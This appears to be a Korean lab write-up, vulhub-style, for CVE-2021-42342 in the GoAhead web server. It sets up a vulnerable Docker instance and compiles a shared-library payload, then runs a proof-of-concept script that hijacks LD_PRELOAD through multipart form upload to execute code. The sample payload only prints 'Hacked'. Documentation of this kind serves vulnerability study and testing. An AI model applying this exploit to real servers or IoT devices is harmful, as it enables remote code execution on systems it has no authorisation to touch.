# CVE-2021-42342

GoAhead 4.x 및 5.x, 즉 5.1.5 이전 버전에서 발견된 문제가 있습니다.파일 업로드 필터에서 사용자 양식 변수가 CGI 접두사 없이 CGI 스크립트로 전달될 수 있습니다. 이는 신뢰할 수 없는 환경 변수를 취약한 CGI 스크립트로 터널링할 수 있게 합니다.
공격자는 이 기능을 사용하여 멀티파트 양식에 공유 라이브러리 페이로드를 업로드하고 LD_PRELOAD 환경 변수를 탈취하여 임의의 코드를 실행할 수 있습니다.

이 취약성은 CVE-2017-17562의 패치 우회입니다.

References:

- https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
- https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
- https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg

## 취약 환경구성

다음 명령어로 GoAhead 5.1.4를 실행 

```
docker compose up -d
```
### your-ip는 ifconfig를 통해서 확인한 본인의 ip주소를 입력하면 된다.
그러면 url에  `http://your-ip:8080`를 입력하면 Congratulations! The server is up and running. 을 확인할 수 있다.
 CGI scripts는 `http://your-ip:8080/cgi-bin/index`.다음 url에서 확인할 수 있다.

## Exploit

우선,이 hijack code(payload.c)를 동적공유라이브러리에 컴파일한다.:

```C
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World\r\n\r\n", 16);
    write(1, "Hacked\n", 7);
}
```

> 명심해야 할 건, GoAhead는 거의 대부분의 IoT 디바이스에서 실행되는 간단한 임베디드 웹 서버이므로, 동적 공유 라이브러리의 형식은 타겟 서버의 아키텍처에 따라 다르다. 비록, vulhub는 당신에게 간단한 예제를 보여주지만, real world에서는 exploit을 컴파일하는 것은 이 메뉴얼만큼 쉽지는 않다.

x86/64 환경에서 컴파일 :

```
gcc -s -shared -fPIC ./payload.c -o payload.so
```


우리는 [this script](poc.py) 로 취약점을 확인해볼 것이다.

```
python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so
```
만약 이 부분에서 "Example"이 나오지 않고 오류가 나온다면 스크립트의 파일 권한이 없어서 그럴 수 있기 때문에 docker에서 index에 실행권한이 있는지 확인하고, 없다면 실행권한을 부여해야 한다.

![image](https://github.com/ijh4723/whitehat/assets/116932933/895004bc-0d82-46dc-9dff-8fe96017c41b)

hijacking이 성공적으로 됐다.:

